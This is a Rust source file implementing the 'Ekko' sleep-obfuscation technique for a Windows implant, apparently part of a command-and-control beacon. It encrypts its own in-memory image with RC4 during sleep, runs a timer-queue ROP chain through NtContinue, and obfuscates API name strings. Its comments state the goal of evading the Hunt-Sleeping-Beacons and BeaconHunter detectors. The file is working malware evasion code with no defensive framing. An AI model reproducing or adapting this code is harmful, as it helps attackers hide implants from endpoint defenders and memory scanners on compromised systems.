#![allow(non_snake_case)]

use core::arch::asm;
use std::ptr;
use winapi::shared::minwindef::{DWORD, LPVOID, ULONG};
use winapi::shared::ntdef::PVOID;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
use winapi::um::synchapi::{CreateEventA, SetEvent, WaitForSingleObject};
use winapi::um::winbase::{
    CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue, INFINITE,
};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

const WT_EXECUTEINTIMERTHREAD: ULONG = 0x00000020;
const FRAME_SIZE: usize = 0x100;
const FRAME_COUNT: usize = 6;

type FnNtContinue = unsafe extern "system" fn(ctx: *mut CONTEXT, raise: u8);
type FnSystemFunction032 = unsafe extern "system" fn(
    data: *mut USTRING,
    key: *mut USTRING,
) -> i32;
type FnRtlExitUserThread = unsafe extern "system" fn(status: u32);

#[repr(C)]
struct USTRING {
    length: u32,
    maximum_length: u32,
    buffer: *mut u8,
}

unsafe fn get_image_base_and_size() -> (*mut u8, usize) {
    let base = winapi::um::libloaderapi::GetModuleHandleA(ptr::null()) as *mut u8;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt = base.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    (base, (*nt).OptionalHeader.SizeOfImage as usize)
}

unsafe fn resolve_fn(dll: &str, func: &str) -> Option<*const ()> {
    let h = LoadLibraryA(dll.as_ptr() as *const i8);
    if h.is_null() { return None; }
    let p = GetProcAddress(h, func.as_ptr() as *const i8);
    if p.is_null() { return None; }
    Some(p as *const ())
}

fn fallback_sleep(ms: u32) {
    std::thread::sleep(std::time::Duration::from_millis(ms as u64));
}

/// Encrypt the PE image in memory, sleep for `ms` milliseconds via a
/// timer-queue ROP chain, then decrypt and resume.
///
/// Uses WaitForSingleObject (not NtDelayExecution) so the sleeping thread's
/// wait reason is WrQueue, not DelayExecution. This evades Hunt-Sleeping-Beacons
/// and BeaconHunter.
///
/// ROP chain (6 timer callbacks, each using NtContinue):
///   VirtualProtect(RW) -> SystemFunction032(encrypt)
///   -> WaitForSingleObject(event, ms)
///   -> SystemFunction032(decrypt) -> VirtualProtect(RX) -> SetEvent(done)
///
/// Each frame gets its own fake stack with RtlExitUserThread as the return
/// address. After the target function returns, RtlExitUserThread(0) terminates
/// the timer thread cleanly. The thread pool creates a new timer thread for
/// the next queued callback.
pub unsafe fn encrypted_sleep(ms: u32) {
    let ntdll = obfstr::obfstr!("ntdll.dll\0");
    let advapi = obfstr::obfstr!("advapi32.dll\0");

    let nt_continue: FnNtContinue = match resolve_fn(ntdll, obfstr::obfstr!("NtContinue\0")) {
        Some(p) => std::mem::transmute(p),
        None => { dlog!("ekko: NtContinue resolve failed"); fallback_sleep(ms); return; }
    };
    let sys_f032: FnSystemFunction032 = match resolve_fn(advapi, obfstr::obfstr!("SystemFunction032\0")) {
        Some(p) => std::mem::transmute(p),
        None => { dlog!("ekko: SystemFunction032 resolve failed"); fallback_sleep(ms); return; }
    };
    let rtl_exit: FnRtlExitUserThread = match resolve_fn(ntdll, obfstr::obfstr!("RtlExitUserThread\0")) {
        Some(p) => std::mem::transmute(p),
        None => { dlog!("ekko: RtlExitUserThread resolve failed"); fallback_sleep(ms); return; }
    };

    let (image_base, image_size) = get_image_base_and_size();
    if image_base.is_null() || image_size == 0 {
        fallback_sleep(ms); return;
    }

    // Random RC4 key (on stack, survives PE encryption)
    let mut rc4_key = [0u8; 16];
    let _ = getrandom::getrandom(&mut rc4_key);

    let sleep_event = CreateEventA(ptr::null_mut(), 1, 0, ptr::null());
    let done_event = CreateEventA(ptr::null_mut(), 1, 0, ptr::null());
    if sleep_event.is_null() || done_event.is_null() {
        fallback_sleep(ms); return;
    }

    let timer_queue = CreateTimerQueue();
    if timer_queue.is_null() {
        CloseHandle(sleep_event); CloseHandle(done_event);
        fallback_sleep(ms); return;
    }

    // Allocate fake stacks for the ROP frames (one per timer callback).
    // Each frame is 256 bytes. [frame_base + 0x80] is RSP (16-byte aligned),
    // with [RSP] = RtlExitUserThread as return address.
    let total_stack = FRAME_COUNT * FRAME_SIZE;
    let fake_stacks = VirtualAlloc(
        ptr::null_mut(),
        total_stack,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut u8;
    if fake_stacks.is_null() {
        DeleteTimerQueue(timer_queue);
        CloseHandle(sleep_event); CloseHandle(done_event);
        fallback_sleep(ms); return;
    }

    // Plant return addresses (RtlExitUserThread) on each fake stack
    let rtl_exit_addr = rtl_exit as u64;
    for i in 0..FRAME_COUNT {
        let rsp_ptr = fake_stacks.add(i * FRAME_SIZE + 0x80) as *mut u64;
        *rsp_ptr = rtl_exit_addr;
    }

    // USTRING structs (on stack, not in PE image)
    let mut img_us = USTRING {
        length: image_size as u32,
        maximum_length: image_size as u32,
        buffer: image_base,
    };
    let mut key_us = USTRING {
        length: rc4_key.len() as u32,
        maximum_length: rc4_key.len() as u32,
        buffer: rc4_key.as_mut_ptr(),
    };

    let mut old_protect: DWORD = 0;

    // Build 6 CONTEXT frames
    let mut contexts: [CONTEXT; 6] = [std::mem::zeroed(); 6];
    for (i, ctx) in contexts.iter_mut().enumerate() {
        ctx.ContextFlags = CONTEXT_FULL;
        ctx.Rsp = fake_stacks.add(i * FRAME_SIZE + 0x80) as u64;
    }

    // Frame 0: VirtualProtect(image_base, image_size, PAGE_READWRITE, &old_protect)
    contexts[0].Rip = VirtualProtect as u64;
    contexts[0].Rcx = image_base as u64;
    contexts[0].Rdx = image_size as u64;
    contexts[0].R8 = PAGE_READWRITE as u64;
    contexts[0].R9 = &mut old_protect as *mut DWORD as u64;

    // Frame 1: SystemFunction032(&img_us, &key_us) -- encrypt
    contexts[1].Rip = sys_f032 as u64;
    contexts[1].Rcx = &mut img_us as *mut USTRING as u64;
    contexts[1].Rdx = &mut key_us as *mut USTRING as u64;

    // Frame 2: WaitForSingleObject(sleep_event, ms) -- the actual sleep
    contexts[2].Rip = WaitForSingleObject as u64;
    contexts[2].Rcx = sleep_event as u64;
    contexts[2].Rdx = ms as u64;

    // Frame 3: SystemFunction032(&img_us, &key_us) -- decrypt (RC4 is symmetric)
    contexts[3].Rip = sys_f032 as u64;
    contexts[3].Rcx = &mut img_us as *mut USTRING as u64;
    contexts[3].Rdx = &mut key_us as *mut USTRING as u64;

    // Frame 4: VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ, &old_protect)
    contexts[4].Rip = VirtualProtect as u64;
    contexts[4].Rcx = image_base as u64;
    contexts[4].Rdx = image_size as u64;
    contexts[4].R8 = PAGE_EXECUTE_READ as u64;
    contexts[4].R9 = &mut old_protect as *mut DWORD as u64;

    // Frame 5: SetEvent(done_event) -- signal main thread
    contexts[5].Rip = SetEvent as u64;
    contexts[5].Rcx = done_event as u64;

    // Queue timers with staggered due times for serial execution.
    // WT_EXECUTEINTIMERTHREAD serializes on the timer thread. Staggering
    // by 100ms guarantees ordering even across timer thread recycling.
    let mut timers: [HANDLE; 6] = [ptr::null_mut(); 6];
    for (i, ctx) in contexts.iter_mut().enumerate() {
        let ok = CreateTimerQueueTimer(
            &mut timers[i],
            timer_queue,
            Some(std::mem::transmute::<
                FnNtContinue,
                unsafe extern "system" fn(PVOID, u8),
            >(nt_continue)),
            ctx as *mut CONTEXT as LPVOID,
            (i as DWORD) * 100,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );
        if ok == 0 {
            dlog!("ekko: CreateTimerQueueTimer[{i}] failed");
            VirtualFree(fake_stacks as LPVOID, 0, MEM_RELEASE);
            DeleteTimerQueue(timer_queue);
            CloseHandle(sleep_event); CloseHandle(done_event);
            fallback_sleep(ms);
            return;
        }
    }

    // Block until the final SetEvent(done_event) fires after decrypt + RX restore
    WaitForSingleObject(done_event, INFINITE);

    // Cleanup
    DeleteTimerQueue(timer_queue);
    VirtualFree(fake_stacks as LPVOID, 0, MEM_RELEASE);
    CloseHandle(sleep_event);
    CloseHandle(done_event);

    // Wipe key material
    for b in rc4_key.iter_mut() {
        ptr::write_volatile(b, 0);
    }
}
